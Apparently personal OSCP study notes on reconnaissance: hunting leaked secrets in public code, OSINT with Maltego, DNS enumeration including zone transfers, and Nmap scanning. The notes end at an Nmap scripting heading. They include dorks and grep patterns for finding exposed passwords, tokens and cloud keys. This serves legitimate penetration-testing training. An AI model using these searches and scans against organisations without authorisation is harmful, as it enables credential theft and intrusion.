> **WHOIS gives you context. DNS gives you infrastructure. Subdomain enumeration expands the attack surface.**

---------------------------------

# ==OpenSource Code Enumeration
![[open-source-101-everything.jpg|700]]
 


![[Pasted image 20260906211358.png]]

![[Pasted image 20260906212210.png]]
## 1. What is Open-Source Code Enumeration?

**Open-source code enumeration** is the process of searching publicly available source code for information that can help identify:

- Hidden endpoints
- API routes
- Parameters
- Authentication mechanisms
- Hardcoded credentials
- API keys/tokens
- Internal hostnames
- Cloud resources
- Debug functionality
- Technology/frameworks
- Vulnerable dependencies
- Interesting application logic

The goal is to expand the **attack surface** beyond what is visible through normal website browsing.

---

## 2. Where to Search?

### GitHub

The primary source for public source-code reconnaissance.

Useful searches:

```
"target.com"
"api.target.com"
"target" password
"target" secret
"target" token
"target" api_key
"target" credentials
```

Search for specific file types:

```
filename:.env
filename:config
filename:docker-compose.yml
filename:swagger.json
filename:openapi.json
filename:package.json
filename:web.config
filename:.npmrc
```

Language-specific:

```
language:javascript
language:python
language:php
language:go
language:java
```

---

## 3. Search for the Target's Domain

One of the most useful techniques is searching for the organization's domain inside source code.

Example:

```
"example.com"
```

Then look for:

```
api.example.com
dev.example.com
staging.example.com
internal.example.com
admin.example.com
```

You may discover hosts that aren't present in the normal DNS/subdomain enumeration.

---

## 4. Interesting Files

Pay special attention to:

|File|Why interesting|
|---|---|
|`.env`|Environment variables/secrets|
|`config.php`|Application configuration|
|`config.json`|API/configuration data|
|`settings.py`|Django configuration|
|`application.properties`|Java configuration|
|`docker-compose.yml`|Services/ports/environment|
|`Dockerfile`|Infrastructure information|
|`swagger.json`|API documentation|
|`openapi.json`|API endpoints|
|`package.json`|Dependencies/scripts|
|`web.config`|IIS configuration|
|`.npmrc`|npm configuration/tokens|
|`composer.json`|PHP dependencies|
|`requirements.txt`|Python dependencies|

---

## 5. Secrets to Look For

Search for keywords such as:

```
password
passwd
secret
token
apikey
api_key
access_key
private_key
client_secret
authorization
bearer
credentials
```

Common patterns:

```
API_KEY=
SECRET_KEY=
AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
DATABASE_URL=
```

**Important:** finding a secret in public code isn't automatically a valid vulnerability. You need to determine whether it is:

1. Real
2. Still active
3. Accessible to unauthorized users
4. Actually exploitable
5. Within the target's scope

---
![[Pasted image 20260906213923.png]]

----------------------

## 6. Find Hidden Endpoints

Source code can reveal endpoints that aren't linked from the application UI.

Look for:

```
/api/
/v1/
/v2/
/admin/
/internal/
/debug/
/graphql
/swagger
/openapi
```

JavaScript examples:

```
fetch("/api/users")
fetch("/api/admin/settings")
axios.get("/v1/account")
```

You can extract these URLs and add them to your recon pipeline.

---

## 7. JavaScript Enumeration

JavaScript bundles are particularly valuable because they often contain:

```
API endpoints
API base URLs
GraphQL endpoints
Feature flags
Internal services
Parameter names
Authentication logic
Third-party integrations
```

Search JavaScript for:

```
fetch(
axios
XMLHttpRequest
/graphql
/api/
Authorization
Bearer
client_id
redirect_uri
```

Example:

```
const API_URL = "https://api.example.com/v1";
```

This immediately gives you another asset:

```
api.example.com
```

---

## 8. Git History

Don't only inspect the current source tree.

Git history may contain information that developers later removed.

Useful concepts:

```
git log
git log --all
git show <commit>
git diff
```

Look for commits such as:

```
remove credentials
fix API key
remove debug endpoint
temporary password
production config
```

A deleted secret may still exist in an old commit.

---

## 9. Branch Enumeration

Public repositories may contain branches such as:

```
main
master
dev
development
staging
testing
production
feature/*
release/*
```

Development branches can reveal functionality that isn't deployed publicly.

For example:

```
dev/api/admin
```

might reveal an administrative API that isn't obvious from the production application.

---

## 10. Forks

Forks are another important source.

A repository may have:

```
original repository
      ↓
fork
      ↓
old implementation
      ↓
removed endpoint
      ↓
old configuration
```

Something removed from the main repository might still exist in a fork.

---

## 11. Dependencies

Inspect dependency files:

```
package.json
requirements.txt
composer.json
pom.xml
Gemfile
go.mod
```

Look for:

- Outdated libraries
- Vulnerable versions
- Development packages
- Internal/private packages
- Interesting integrations

For OSCP, remember that dependency discovery is useful for **attack-surface identification**, but don't automatically assume an outdated dependency is exploitable.

---

## 12. Infrastructure Information

Source code can reveal infrastructure details:

```
AWS
Azure
GCP
Docker
Kubernetes
Terraform
Ansible
Jenkins
GitLab
CI/CD
```

Interesting files:

```
Dockerfile
docker-compose.yml
*.tf
*.yaml
*.yml
Jenkinsfile
.gitlab-ci.yml
```

These may reveal:

```
internal IPs
hostnames
ports
service names
cloud resources
deployment architecture
```

---

## 13. Useful GitHub Search Patterns

For a target:

```
"example.com"
"api.example.com"
"*.example.com"
```

Secrets:

```
"example.com" password
"example.com" secret
"example.com" token
"example.com" api_key
```

Configuration:

```
"example.com" filename:.env
"example.com" filename:config
"example.com" filename:docker-compose.yml
```

API:

```
"example.com" "/api/"
"example.com" "/graphql"
"example.com" "swagger"
"example.com" "openapi"
```

---

## 14. GitHub Dorks vs Google Dorks

### GitHub

Best for:

```
source code
commits
branches
forks
configuration
secrets
endpoints
dependencies
```

### Google

Useful for discovering indexed repositories/files:

```
site:github.com "example.com"
site:github.com "api.example.com"
site:github.com "example.com" password
site:github.com "example.com" secret
```

---

## 15. Tools

Common tools for source-code/repository reconnaissance:

```
GitHub Search
git
ripgrep (rg)
Gitleaks
TruffleHog
Semgrep
GitHub Code Search
```

Example local search:

```
rg -i "password|secret|token|apikey|api_key" .
```

Search URLs:

```
rg -i "https?://|/api/|/graphql" .
```

---

## 16. Recon Workflow

A simple OSCP workflow:

```
Target
  │
  ├── Identify organization
  │
  ├── Search GitHub
  │      │
  │      ├── Repositories
  │      ├── Users
  │      ├── Forks
  │      └── Commits
  │
  ├── Download interesting repositories
  │
  ├── Search source code
  │      │
  │      ├── URLs
  │      ├── Endpoints
  │      ├── Credentials
  │      ├── Tokens
  │      ├── Hostnames
  │      └── Configuration
  │
  ├── Inspect Git history
  │
  ├── Inspect branches
  │
  ├── Identify technologies/dependencies
  │
  └── Add discovered assets to enumeration
```

---

## 17. Key OSCP Takeaways

> **Don't treat public source code as just "code." Treat it as an information source for the entire attack surface.**

Remember to check:

```
✓ Repositories
✓ Git history
✓ Branches
✓ Forks
✓ JavaScript
✓ Configuration files
✓ Environment files
✓ API documentation
✓ Dependencies
✓ Docker/Kubernetes files
✓ CI/CD configuration
✓ Hardcoded secrets
✓ Internal hostnames
✓ Hidden endpoints
```

### Golden Rule

**Discovery → Verification → Exploitation**

Finding:

```
AWS_KEY=...
```

is **not** enough.

Finding:

```
AWS_KEY=...
      ↓
valid credentials
      ↓
unauthorized access
      ↓
impact
```

is what turns enumeration into a meaningful security finding.

---------
# ==OSINT & Maltego==
![[maltego.png]]
## https://osintframework.com

## 1. What is OSINT?

**OSINT — Open-Source Intelligence** is the process of collecting and analyzing information from publicly available sources.

In OSCP, OSINT is mainly useful for **reconnaissance and attack-surface discovery**.

Typical objectives:

```
Organization
    ↓
Domains
    ↓
Subdomains
    ↓
IP addresses
    ↓
Technologies
    ↓
Employees / usernames
    ↓
Public repositories
    ↓
Leaked information
    ↓
Potential attack surface
```

---

## 2. OSINT Sources

Common sources include:

|Source|Useful Information|
|---|---|
|Search engines|Indexed pages, documents, domains|
|WHOIS/RDAP|Domain registration information|
|DNS|Hosts, mail servers, DNS records|
|Certificate Transparency|Subdomains and certificates|
|GitHub|Source code, endpoints, infrastructure|
|LinkedIn|Employees, roles, technology clues|
|SecurityTrails|DNS/history|
|VirusTotal|Domains, IPs, relationships|
|Shodan|Internet-facing services|
|Censys|Hosts/certificates|
|Wayback Machine|Historical websites|
|Google Groups/forums|Public discussions|
|Paste sites|Potential leaked information|

---

## 3. Passive vs Active Recon

### Passive Recon

Gather information **without directly interacting with the target infrastructure**.

Examples:

```
WHOIS/RDAP
Google
GitHub
Certificate Transparency
Wayback Machine
Shodan
Censys
LinkedIn
VirusTotal
```

### Active Recon

Interact directly with the target.

Examples:

```
DNS queries
Port scanning
Web requests
Service enumeration
Directory enumeration
```

For OSCP, understand the distinction because it affects both **methodology and scope**.

---

## 4. Search Engine OSINT

Search engines can reveal information that isn't obvious from the website.

Useful operators:

```
site:
inurl:
intitle:
filetype:
ext:
```

Examples:

```
site:example.com
site:example.com filetype:pdf
site:example.com filetype:xlsx
site:example.com inurl:admin
site:example.com inurl:login
site:example.com intitle:"index of"
```

Search for technologies:

```
site:example.com "WordPress"
site:example.com "Jenkins"
site:example.com "GitLab"
```

---

## 5. WHOIS / RDAP

WHOIS traditionally provides registration information.

Modern registration lookup increasingly uses **RDAP**.

Potential information:

```
Domain
Registrar
Registration dates
Expiration
Nameservers
Registrant information
Organization
```

Example:

```
whois example.com
```

However, privacy protection often hides registrant information.

---

## 6. DNS OSINT

DNS can reveal relationships between infrastructure.

Important records:

```
A       → IPv4
AAAA    → IPv6
MX      → Mail server
NS      → Nameserver
CNAME   → Alias
TXT     → Text/configuration information
SOA     → Zone information
```

Example:

```
dig example.com
dig example.com MX
dig example.com NS
dig example.com TXT
```

Potential discoveries:

```
mail.example.com
vpn.example.com
dev.example.com
staging.example.com
```

---

## 7. Certificate Transparency

Certificate Transparency logs are excellent for discovering hostnames.

Search for:

```
example.com
*.example.com
```

Certificates may reveal:

```
api.example.com
dev.example.com
staging.example.com
vpn.example.com
old.example.com
```

Useful service:

**crt.sh**

Concept:

```
Certificate
      ↓
Subject / SAN
      ↓
Hostname
      ↓
Potential subdomain
      ↓
Verify DNS
```

Remember: **a hostname appearing in a certificate does not necessarily mean the host is currently alive.**

---

## 8. Maltego

Maltego is a visual OSINT and link-analysis platform.

Instead of looking at individual pieces of information, Maltego helps visualize **relationships**.

Example:

```
                 example.com
                      │
        ┌─────────────┼─────────────┐
        ↓             ↓             ↓
     Domain          DNS          Email
        │             │             │
        ↓             ↓             ↓
  Subdomains         IPs        Employees
                      │
              ┌───────┴───────┐
              ↓               ↓
           Services         Hosting
```

This relationship-based approach is the key concept behind Maltego.

---

## 9. Maltego Entities

Maltego works with **entities** representing objects.

Common examples:

```
Domain
Website
IP Address
DNS Name
Person
Email Address
Phone Number
Organization
URL
Social Media Account
```

You connect entities through relationships.

Example:

```
Domain
  ↓
DNS Name
  ↓
IP Address
  ↓
Netblock
  ↓
Other Hosts
```

---

## 10. Transforms

A **Transform** takes one entity and attempts to discover related entities.

Example:

```
example.com
     │
     └── Transform
             ↓
       DNS Names
             ↓
     api.example.com
     mail.example.com
     dev.example.com
```

Another:

```
example.com
     ↓
   IP address
     ↓
   Netblock
```

The important idea:

> **Transforms automate relationship discovery between OSINT entities.**

---

## 11. Maltego Investigation Workflow

### Step 1 — Start with the organization

```
Organization
      ↓
Domain
```

### Step 2 — Enumerate domains

```
Domain
   ↓
DNS Names
```

### Step 3 — Resolve infrastructure

```
DNS Name
   ↓
IP Address
```

### Step 4 — Investigate infrastructure

```
IP
 ↓
Netblock
 ↓
Other related infrastructure
```

### Step 5 — Investigate people

```
Organization
      ↓
Employees
      ↓
Names
      ↓
Email addresses
      ↓
Usernames
```

### Step 6 — Correlate everything

```
People
  │
  ├── Emails
  ├── Usernames
  └── Organization
          │
          ├── Domains
          ├── Subdomains
          └── Infrastructure
```

---

## 12. Infrastructure OSINT

Useful questions:

```
Who owns the domain?
Who hosts it?
What IP addresses are associated with it?
What other domains share infrastructure?
What certificates exist?
What subdomains exist?
What technologies are visible?
What historical infrastructure existed?
```

This can expose forgotten assets such as:

```
old.example.com
dev.example.com
staging.example.com
vpn.example.com
```

---

## 13. People OSINT

Employee information can sometimes help understand the organization's technology stack.

For example:

```
Employee
   ↓
Job title
   ↓
Technology
   ↓
Potential infrastructure
```

If public information indicates that an organization uses:

```
AWS
Kubernetes
GitLab
Jenkins
Docker
Azure
```

those technologies become useful reconnaissance leads.

**Do not treat employee information as a license to target individuals.** In OSCP, keep the focus on the authorized assessment scope.

---

## 14. Email Enumeration

Possible sources:

```
Company website
Public documents
GitHub
Search engines
Public profiles
Certificate/OSINT databases
```

Common corporate formats:

```
firstname.lastname@example.com
firstinitiallastname@example.com
firstname@example.com
```

The format can sometimes be inferred from multiple publicly available addresses.

---

## 15. Historical OSINT

Historical information can reveal assets that disappeared from the current website.

Useful sources:

```
Wayback Machine
Historical DNS
Old Git repositories
Old certificates
Archived documents
```

Example:

```
Current
example.com
    ↓
Historical data
    ↓
old.example.com
dev.example.com
legacy.example.com
```

Always verify whether the discovered asset is still relevant and in scope.

---

## 16. Shodan / Censys

These services can provide passive information about internet-facing infrastructure.

Potential information:

```
IP
Open ports
Service banners
TLS certificates
Software
Operating systems
Hostnames
```

Conceptually:

```
Domain
  ↓
IP
  ↓
Internet intelligence
  ↓
Services
```

This is particularly useful for building an infrastructure map before active testing.

---

## 17. OSINT → Attack Surface

The important OSCP skill isn't simply collecting information.

It's **turning information into an attack surface.**

Example:

```
OSINT
  ↓
dev.example.com
  ↓
DNS resolves
  ↓
HTTP service
  ↓
Technology identified
  ↓
Version identified
  ↓
Potential attack path
```

Another:

```
GitHub
  ↓
API endpoint discovered
  ↓
Endpoint verified
  ↓
Authentication behavior examined
  ↓
Potential vulnerability
```

---

## 18. Maltego Mental Model

Think of Maltego as a **relationship graph** rather than a scanner.

```
                Organization
                /     |      \
               /      |       \
          Domains   People   Infrastructure
            /         |          \
           /          |           \
     Subdomains     Emails       IPs
          |                       |
          ↓                       ↓
       Websites                Services
```

Your job is to find **interesting relationships**.

-------------
# ==DNS Enumeration==
![[672fae24-30b4-45d9-a1f4-0475b70ee2b2.png|593]]
## tools

- DNSRecon
- DNSenum
- Other tools :
- Fierce - DNSdumpster - Dnsmap - Metagoofil  - Dmitry - Recon-ng

---------
- Forward Lookup Brute Force
-  host -t A domain name
- Reverse Lookup Brute Force
- Host -t PTR //  IP 
- DNS Zone Transfers
- Full dump of the zone files.
- host -I (domain name) (dns server address)

## 1. What is DNS?

**DNS (Domain Name System)** translates domain names into IP addresses and also stores different types of information about a domain.

Common DNS records:

|Record|Purpose|
|---|---|
|`A`|Domain → IPv4|
|`AAAA`|Domain → IPv6|
|`CNAME`|Alias → another hostname|
|`MX`|Mail servers|
|`NS`|Authoritative name servers|
|`TXT`|Text information, SPF, verification, etc.|
|`SOA`|Zone authority information|
|`PTR`|IP → hostname|
|`SRV`|Service discovery|
|`CAA`|Certificate authority restrictions|

---

## 2. Basic DNS Queries

### `nslookup`

```
nslookup example.com
```

Specific record:

```
nslookup -type=A example.com
nslookup -type=MX example.com
nslookup -type=NS example.com
nslookup -type=TXT example.com
```

### `dig`

Preferred Linux tool:

```
dig example.com
```

Specific records:

```
dig example.com A
dig example.com AAAA
dig example.com MX
dig example.com NS
dig example.com TXT
dig example.com SOA
```

Short output:

```
dig +short example.com
```

---

## 3. Identify Name Servers

Start by finding the authoritative DNS servers:

```
dig NS example.com
```

Example:

```
example.com.   IN   NS   ns1.example.com.
example.com.   IN   NS   ns2.example.com.
```

Then query the nameserver directly:

```
dig @ns1.example.com example.com
```

This is useful because different DNS resolvers may provide different cached information.

---

## 4. SOA Enumeration

```
dig SOA example.com
```

SOA can reveal:

- Primary nameserver
- Responsible administrator mailbox
- Serial number
- Refresh interval
- Retry interval
- Expiration
- Minimum TTL

Example:

```
example.com. IN SOA ns1.example.com. admin.example.com. ...
```

Convert:

```
admin.example.com.
```

to:

```
admin@example.com
```

when interpreting the administrative contact.

---

## 5. MX Enumeration

Find mail infrastructure:

```
dig MX example.com
```

Example:

```
10 mail.example.com.
20 backup.example.com.
```

Then enumerate the returned hosts:

```
dig mail.example.com
```

### Why it matters

MX records can reveal:

- Internal naming conventions
- Third-party services
- Separate infrastructure
- Potentially interesting hosts

---

## 6. TXT Records

```
dig TXT example.com
```

TXT records can contain:

- SPF
- Domain verification
- Google/Microsoft verification
- DKIM information
- Other service metadata

Example:

```
"v=spf1 include:_spf.google.com ~all"
```

Look for:

```
include:
```

because it may reveal external infrastructure/providers.

---

## 7. Reverse DNS

Reverse DNS maps:

```
IP → hostname
```

Use:

```
dig -x 10.10.10.10
```

or:

```
nslookup 10.10.10.10
```

Example:

```
10.10.10.10 → server01.example.com
```

### OSCP relevance

PTR records can reveal:

- Hostnames
- Server naming conventions
- Infrastructure roles
- Potential additional targets

---

## 8. DNS Zone Transfer

One of the most important DNS checks.

A zone transfer uses **AXFR** to replicate DNS zone data between DNS servers.

Test:

```
dig axfr example.com @ns1.example.com
```

or:

```
dig axfr example.com @ns2.example.com
```

If successful, you may receive:

```
example.com
www.example.com
mail.example.com
dev.example.com
vpn.example.com
internal.example.com
```

### Successful zone transfer

A successful response can expose a large portion of the DNS namespace.

Look for:

- Internal hostnames
- Development systems
- VPN
- Mail servers
- Admin panels
- Staging systems
- Subdomains

---

## 9. Zone Transfer with `host`

```
host -l example.com ns1.example.com
```

Alternative:

```
host -l example.com ns2.example.com
```

---

## 10. Subdomain Enumeration

DNS enumeration is not only about querying known records.

You can attempt to discover subdomains.

Common candidates:

```
www
mail
ftp
vpn
dev
test
staging
api
admin
portal
git
gitlab
jenkins
wiki
blog
```

Using `dig` manually:

```
dig dev.example.com
dig staging.example.com
dig api.example.com
```

---

## 11. `dnsrecon`

Very useful enumeration tool:

```
dnsrecon -d example.com
```

Standard enumeration:

```
dnsrecon -d example.com -t std
```

Brute force:

```
dnsrecon -d example.com -D /usr/share/wordlists/subdomains-top1million-5000.txt -t brt
```

Zone transfer:

```
dnsrecon -d example.com -t axfr
```

Reverse lookup:

```
dnsrecon -r 10.10.10.0/24
```

---

## 12. `dnsenum`

Another useful tool:

```
dnsenum example.com
```

It can perform several DNS enumeration tasks including:

- NS discovery
- MX discovery
- Subdomain enumeration
- Reverse lookups
- Zone transfer attempts

---

## 13. `fierce`

```
fierce --domain example.com
```

Useful for discovering DNS hosts and potential subdomains.

---

## 14. `subfinder`

For broader passive subdomain enumeration:

```
subfinder -d example.com
```

Save results:

```
subfinder -d example.com -o subdomains.txt
```

For multiple domains:

```
subfinder -dL domains.txt -o subdomains.txt
```

---

## 15. `amass`

Passive enumeration:

```
amass enum -passive -d example.com
```

More comprehensive enumeration:

```
amass enum -d example.com
```

---

## 16. Check Every Discovered Host

Finding a subdomain isn't the end.

Example:

```
dev.example.com
vpn.example.com
api.example.com
git.example.com
```

Resolve them:

```
for sub in $(cat subdomains.txt); do
    dig +short $sub
done
```

Then identify live HTTP services:

```
cat subdomains.txt | httpx
```

---

## 17. DNS Enumeration Workflow

A good OSCP workflow:

```
Target Domain
     │
     ▼
Identify NS
     │
     ├──► SOA
     │
     ├──► MX
     │
     ├──► TXT
     │
     └──► AXFR
              │
              ▼
      Subdomain Enumeration
              │
       ┌──────┴──────┐
       ▼             ▼
   Passive        Brute Force
       │             │
       └──────┬──────┘
              ▼
        Resolve Hosts
              │
              ▼
      Identify Live Hosts
              │
              ▼
     Continue Enumeration
```

---

## 18. OSCP Quick Checklist

```
[ ] Identify domain
[ ] Enumerate NS records
[ ] Enumerate SOA
[ ] Enumerate MX
[ ] Enumerate TXT
[ ] Enumerate A / AAAA
[ ] Attempt AXFR against each NS
[ ] Perform reverse DNS where applicable
[ ] Enumerate subdomains
[ ] Resolve discovered hosts
[ ] Identify live services
[ ] Record IP ↔ hostname relationships
```

### Essential commands to memorize

```
dig example.com
dig +short example.com
dig NS example.com
dig MX example.com
dig TXT example.com
dig SOA example.com
dig -x <IP>
dig axfr example.com @<nameserver>

host -l example.com <nameserver>

dnsrecon -d example.com
dnsenum example.com
fierce --domain example.com

subfinder -d example.com
amass enum -passive -d example.com
```

**OSCP mindset:** DNS enumeration should answer **“What hosts exist, what infrastructure do they point to, and what naming patterns can I exploit for further enumeration?”**

-----










### Table of Content (1/3)

- Lesson 1 - DNS Enumeration
- Interacting with a DNS Server
- Forward Lookup Brute Force
- Reverse Lookup Brute Force
- DNS Zone Transfers
- Relevant Tools in Kali Linux
----------------



# ==TCP⧸UDP Port Scanning==
![[6387125240336448076985838.jpg]]

--------

![[Pasted image 20260908042307.png]]


## TCP/UDP Port Scanning — OSCP Notes

## 1. What Is Port Scanning?

Port scanning identifies **open, closed, or filtered ports** on a target host.

- **TCP** → connection-oriented
- **UDP** → connectionless
- Port range: `1–65535`
- Common ports: `1–1024`

### Port states

|State|Meaning|
|---|---|
|`open`|A service is listening|
|`closed`|Host responds, but no service is listening|
|`filtered`|Firewall/filter prevents determining the state|
|`open\|filtered`|Common with UDP; Nmap cannot determine which|

---

## 2. TCP Scanning

### TCP SYN Scan — `-sS`

The most important TCP scan for OSCP.

```
sudo nmap -sS <IP>
```

How it works:

```
Attacker        Target
   |              |
   | --- SYN ---> |
   | <--- SYN/ACK |  OPEN
   | --- RST ---> |
```

If:

```
SYN → SYN/ACK
```

→ **Port is open**

If:

```
SYN → RST
```

→ **Port is closed**

If there's no response / ICMP filtering:

→ **Likely filtered**

---

## 3. TCP Connect Scan — `-sT`

```
nmap -sT <IP>
```

Completes the entire TCP handshake.

```
SYN
   ↓
SYN/ACK
   ↓
ACK
```

Useful when you don't have privileges for a SYN scan.

### Difference

|Scan|Flag|Handshake|
|---|---|---|
|SYN|`-sS`|Half-open|
|Connect|`-sT`|Full TCP connection|

---

## 4. Scan All TCP Ports

Default Nmap scans only the most common 1,000 ports.

For OSCP, don't rely only on that.

```
sudo nmap -p- <IP>
```

Faster:

```
sudo nmap -p- --min-rate 5000 <IP>
```

Then perform detailed enumeration on discovered ports:

```
sudo nmap -sC -sV -p22,80,443,445 <IP>
```

**Typical workflow:**

```
Full TCP scan
      ↓
Discover open ports
      ↓
Service/version detection
      ↓
Enumeration
```

---

## 5. UDP Scanning

UDP is slower and behaves differently from TCP.

```
sudo nmap -sU <IP>
```

Common UDP ports:

```
53    DNS
67/68 DHCP
69    TFTP
123   NTP
137   NetBIOS
161   SNMP
500   IKE
```

Scan specific UDP ports:

```
sudo nmap -sU -p53,123,161 <IP>
```

---

## 6. Why UDP Is Difficult

TCP gives Nmap a clear response:

```
SYN/ACK → Open
RST     → Closed
```

UDP doesn't have a handshake.

For an open UDP service:

```
UDP packet
    ↓
Service
    ↓
Response
```

But if there's no response, it could mean:

```
OPEN
   OR
FILTERED
```

Therefore Nmap often reports:

```
open|filtered
```

---

## 7. UDP Closed Ports

A closed UDP port will often respond with:

```
ICMP Port Unreachable
```

Example:

```
UDP probe
   ↓
Target
   ↓
ICMP Port Unreachable
```

→ **closed**

---

## 8. Scan TCP + UDP

```
sudo nmap -sS -sU <IP>
```

But this can be slow.

For OSCP, a practical approach is usually:

```
sudo nmap -p- <IP>
```

then:

```
sudo nmap -sU --top-ports 100 <IP>
```

---

## 9. Service & Version Detection

Once ports are discovered:

```
sudo nmap -sV -p22,80,443 <IP>
```

Example:

```
22/tcp   open  ssh     OpenSSH 8.2
80/tcp   open  http    Apache 2.4.41
443/tcp  open  https   nginx 1.18
```

`-sV` attempts to determine:

- Service
- Version
- Sometimes additional information

---

## 10. Default Scripts

```
nmap -sC <IP>
```

Equivalent to:

```
nmap --script=default <IP>
```

Very useful for OSCP because default NSE scripts can reveal additional information.

Combined:

```
sudo nmap -sC -sV -p22,80,443 <IP>
```

---

## 11. Aggressive Scan

```
sudo nmap -A <IP>
```

Enables several features including:

```
OS detection
Version detection
Default scripts
Traceroute
```

Useful, but it generates considerably more traffic.

---

## 12. OS Detection

```
sudo nmap -O <IP>
```

Example:

```
OS details:
Linux 5.x
```

Combine with:

```
sudo nmap -O -sV <IP>
```

OS detection is based on network behavior/fingerprinting, so results aren't always exact.

---

## 13. Useful Nmap Options

|Option|Purpose|
|---|---|
|`-p-`|Scan all 65,535 TCP ports|
|`-p80,443`|Scan specific ports|
|`-sS`|TCP SYN scan|
|`-sT`|TCP Connect scan|
|`-sU`|UDP scan|
|`-sV`|Service/version detection|
|`-sC`|Default NSE scripts|
|`-O`|OS detection|
|`-A`|Aggressive scan|
|`-Pn`|Skip host discovery|
|`-n`|No DNS resolution|
|`-T4`|Faster timing|
|`--top-ports 100`|Scan top 100 ports|
|`-oN file.txt`|Normal output|
|`-oA filename`|Save in multiple formats|

---

## 14. Host Discovery

Before scanning ports:

```
nmap -sn 192.168.1.0/24
```

`-sn` performs host discovery without a port scan.

For a host that doesn't respond to ping:

```
nmap -Pn <IP>
```

This tells Nmap:

> Assume the host is up and scan it anyway.

---

## 15. OSCP Enumeration Workflow

A good workflow:

### Step 1 — Host discovery

```
nmap -sn 192.168.1.0/24
```

### Step 2 — Full TCP scan

```
sudo nmap -p- -T4 <IP>
```

### Step 3 — Detailed scan

```
sudo nmap -sC -sV -p<OPEN_PORTS> <IP>
```

Example:

```
sudo nmap -sC -sV -p22,80,139,445,3306 10.10.10.10
```

### Step 4 — UDP

```
sudo nmap -sU --top-ports 100 <IP>
```

### Step 5 — Targeted UDP

If something interesting appears:

```
sudo nmap -sU -sV -p161 <IP>
```

---

## 16. Important OSCP Mindset

**Don't stop after finding the first few ports.**

Bad:

```
nmap <IP>
→ 22
→ 80
→ start exploiting
```

Better:

```
Full TCP
   ↓
Service enumeration
   ↓
UDP top ports
   ↓
Interesting UDP ports
   ↓
Version/script enumeration
   ↓
Web/SMB/FTP/DNS/etc. enumeration
```

A high-numbered port such as:

```
8080
8443
8888
9000
10000
```

can be just as important as:

```
80
443
```

---

## 17. Quick OSCP Cheat Sheet

```
# Host discovery
nmap -sn 10.10.10.0/24

# Basic scan
nmap <IP>

# All TCP ports
sudo nmap -p- <IP>

# Fast full TCP
sudo nmap -p- -T4 <IP>

# Service/version
sudo nmap -sV -p<PORTS> <IP>

# Default scripts
sudo nmap -sC -p<PORTS> <IP>

# Scripts + versions
sudo nmap -sC -sV -p<PORTS> <IP>

# UDP top 100
sudo nmap -sU --top-ports 100 <IP>

# Specific UDP
sudo nmap -sU -sV -p161 <IP>

# OS detection
sudo nmap -O <IP>

# Assume host is up
sudo nmap -Pn <IP>

# Save results
sudo nmap -sC -sV -p<PORTS> -oA target <IP>
```

# ==Nmap TCP⧸UDP==
![[nmap-logo-256x256.png|419]]
## 1. TCP Scanning

### SYN Scan — `-sS`

Most important TCP scan for OSCP.

```
sudo nmap -sS <IP>
```

```
SYN  ──────────────► Target
     ◄────────────── SYN/ACK   → OPEN
RST  ──────────────►

SYN  ──────────────► Target
     ◄────────────── RST       → CLOSED
```

|Response|State|
|---|---|
|`SYN/ACK`|`open`|
|`RST`|`closed`|
|No response / filtering|`filtered`|

---

### TCP Connect — `-sT`

```
nmap -sT <IP>
```

Completes the full TCP handshake:

```
SYN → SYN/ACK → ACK
```

Use when SYN scanning isn't available due to privileges.

---

## 2. TCP Port Range

Default Nmap scans the **top 1,000 TCP ports**.

For OSCP, always consider a full scan:

```
sudo nmap -p- <IP>
```

Specific ports:

```
sudo nmap -p22,80,443 <IP>
```

Port ranges:

```
sudo nmap -p1-10000 <IP>
```

---

## 3. UDP Scanning

```
sudo nmap -sU <IP>
```

UDP has no handshake, so it's slower and less straightforward.

Typical results:

```
Response                    → open
ICMP Port Unreachable       → closed
No response                 → open|filtered
```

Important UDP ports:

|Port|Service|
|---|---|
|53|DNS|
|67/68|DHCP|
|69|TFTP|
|123|NTP|
|137|NetBIOS|
|161|SNMP|
|500|IKE|
|514|Syslog|

For a quick OSCP check:

```
sudo nmap -sU --top-ports 100 <IP>
```

Then investigate interesting ports individually:

```
sudo nmap -sU -sV -p161 <IP>
```

---

## 4. Service Enumeration

After discovering ports:

```
sudo nmap -sV -p22,80,443 <IP>
```

`-sV` attempts to identify:

- Service
- Version
- Product information

Example:

```
22/tcp   open  ssh     OpenSSH 8.2
80/tcp   open  http    Apache 2.4.41
445/tcp  open  microsoft-ds
```

---

## 5. NSE Default Scripts

```
sudo nmap -sC -p22,80,443 <IP>
```

Useful for initial enumeration.

Combine with version detection:

```
sudo nmap -sC -sV -p22,80,443 <IP>
```

This is one of the most useful OSCP commands.

---

## 6. OS Detection

```
sudo nmap -O <IP>
```

Or:

```
sudo nmap -O -sV <IP>
```

Nmap fingerprints the target's network behavior to estimate the OS.

---

## 7. Host Discovery

Scan a network for live hosts:

```
nmap -sn 192.168.1.0/24
```

`-sn` = host discovery only, no port scanning.

If ICMP/ping is blocked:

```
sudo nmap -Pn <IP>
```

`-Pn` tells Nmap to assume the host is up.

---

## 8. TCP + UDP Workflow

### Phase 1 — Full TCP

```
sudo nmap -p- -T4 <IP>
```

### Phase 2 — Enumerate discovered ports

```
sudo nmap -sC -sV -p<PORTS> <IP>
```

### Phase 3 — UDP

```
sudo nmap -sU --top-ports 100 <IP>
```

### Phase 4 — Target interesting UDP ports

```
sudo nmap -sU -sV -p53,161 <IP>
```

---

## 9. Useful Options

|Flag|Purpose|
|---|---|
|`-sS`|TCP SYN scan|
|`-sT`|TCP Connect scan|
|`-sU`|UDP scan|
|`-p-`|All 65,535 ports|
|`-p80,443`|Specific ports|
|`-sV`|Service/version detection|
|`-sC`|Default NSE scripts|
|`-O`|OS detection|
|`-A`|Aggressive scan|
|`-Pn`|Skip host discovery|
|`-n`|Disable DNS resolution|
|`-T4`|Faster timing|
|`--top-ports 100`|Top 100 ports|
|`-oN`|Normal output|
|`-oA`|Save all major formats|

---

## 10. OSCP Cheat Sheet

```
# Basic
nmap <IP>

# Full TCP
sudo nmap -p- <IP>

# Full TCP + faster timing
sudo nmap -p- -T4 <IP>

# Service detection
sudo nmap -sV -p<PORTS> <IP>

# Default scripts + versions
sudo nmap -sC -sV -p<PORTS> <IP>

# UDP top 100
sudo nmap -sU --top-ports 100 <IP>

# Specific UDP
sudo nmap -sU -sV -p161 <IP>

# OS detection
sudo nmap -O <IP>

# Assume host is alive
sudo nmap -Pn <IP>

# Save results
sudo nmap -sC -sV -p<PORTS> -oA target <IP>
```









# ==Nmap NSE, OS & Service Enumeration==
![[Nmap.png]]
## 1. Nmap NSE

**NSE = Nmap Scripting Engine**

NSE allows Nmap to run scripts that perform additional enumeration, detection, and security checks against a target.

### Basic Syntax

